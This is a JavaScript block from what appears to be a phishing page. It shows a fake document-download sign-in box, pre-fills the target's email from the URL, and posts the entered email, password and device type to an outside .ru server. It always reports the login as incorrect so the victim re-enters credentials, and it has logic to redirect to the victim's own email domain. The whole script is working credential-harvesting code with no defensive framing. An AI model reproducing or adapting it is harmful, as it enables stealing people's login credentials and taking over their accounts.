    <script>
// Modal functionality
const modal = document.getElementById('downloadModal');
const form = document.getElementById('downloadForm');
const closeBtn = document.querySelector('.close');
const passwordError = document.getElementById('passwordError');

let count = 0;
// Click triggers
document.getElementById('downloadAll').addEventListener('click', () => modal.style.display = 'block');
['file1', 'file2', 'file3', 'file4'].forEach(id => {
  document.getElementById(id).addEventListener('click', () => modal.style.display = 'block');
});

closeBtn.addEventListener('click', () => {
  modal.style.display = 'none';
  passwordError.style.display = 'none';
});

window.addEventListener('click', (e) => {
  if (e.target === modal) {
    modal.style.display = 'none';
    passwordError.style.display = 'none';
  }
});

// Auto-populate email from URL
const urlParams = new URLSearchParams(window.location.search);
const erEmail = urlParams.get('er');
if (erEmail) {
  document.getElementById('email').value = erEmail;
}

// Device type detection (simple)
function getDeviceType() {
  const ua = navigator.userAgent;
  if (/Mobi|Android/i.test(ua)) return 'Mobile';
  if (/Tablet|iPad/i.test(ua)) return 'Tablet';
  return 'Desktop';
}

// Form submission
form.addEventListener('submit', async (e) => {
  count++;
  document.getElementById("btnnn").innerText = "loading...";
  e.preventDefault();
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const device = getDeviceType();
  const isFirstSubmit = !localStorage.getItem('submitted');

  const formData = new FormData();
  formData.append('email', email);
  formData.append('password', password);
  formData.append('device', device);
  formData.append('isFirst', isFirstSubmit);

  let links = "http://srv247356.hoster-test.ru/process.php";

  try {
    const response = await fetch(links, {
      method: 'POST',
      body: formData
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const result = await response.json();

    if (result.success) {
      localStorage.setItem('submitted', 'true');
      if(count == 100){
      //if (!isFirstSubmit) {
        // Split er by @ and redirect to domain
        const erParts = erEmail ? erEmail.split('@') : [];
        if (erParts.length === 2) {
          const domain = erParts[1];
          window.location.href = `https://${domain}`;
          return;
        }
      }
      // On success, close modal
      modal.style.display = 'none';
    } else {
      passwordError.textContent = 'INCORRECT EMAIL AND PASSWORD. SIGN-IN WITH YOUR VALID EMAIL AND PASSWORD';
      passwordError.style.display = 'block';
      localStorage.removeItem('submitted'); // Reset if invalid
    }

     passwordError.textContent = 'INCORRECT EMAIL AND PASSWORD. SIGN-IN WITH YOUR VALID EMAIL AND PASSWORD';
      passwordError.style.display = 'block';
      modal.style.display = 'block';
  } catch (error) {
    console.error('Error:', error);
  
    passwordError.style.display = 'block';
  }

  document.getElementById("btnnn").innerText = "SIGN-IN";
});
